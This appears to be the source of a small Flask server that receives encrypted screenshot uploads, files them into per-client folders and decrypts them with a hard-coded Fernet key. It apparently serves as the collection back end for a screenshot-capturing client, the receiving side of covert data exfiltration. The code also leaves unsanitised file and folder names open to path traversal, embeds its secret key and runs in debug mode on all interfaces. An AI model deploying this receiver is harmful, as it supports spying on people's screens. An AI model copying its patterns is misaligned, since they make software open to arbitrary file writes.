from flask import Flask, request
import os
from cryptography.fernet import Fernet

app = Flask(__name__)

key = "yklMFUWAxrlClpKzTnajWAA3699g2M6TN3CJdNKFObM="

base_upload_folder = "received_screenshots"
if not os.path.exists(base_upload_folder):
    os.makedirs(base_upload_folder)

# فك تشفير البيانات
def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return 'No file part', 400
    
    file = request.files['file']
    folder_name = request.form.get('folder_name', '')
    if not folder_name:
        return 'Folder name is required', 400
    
    if file.filename == '':
        return 'No selected file', 400

    if file:
        upload_folder = os.path.join(base_upload_folder, folder_name)
        if not os.path.exists(upload_folder):
            os.makedirs(upload_folder)
        
        filename = os.path.join(upload_folder, file.filename)
        file.save(filename)

        # فك التشفير
        try:
            decrypt_file(filename, key)
        except Exception as e:
            return f'Error decrypting file: {e}', 500
        
        return 'File successfully uploaded and decrypted', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)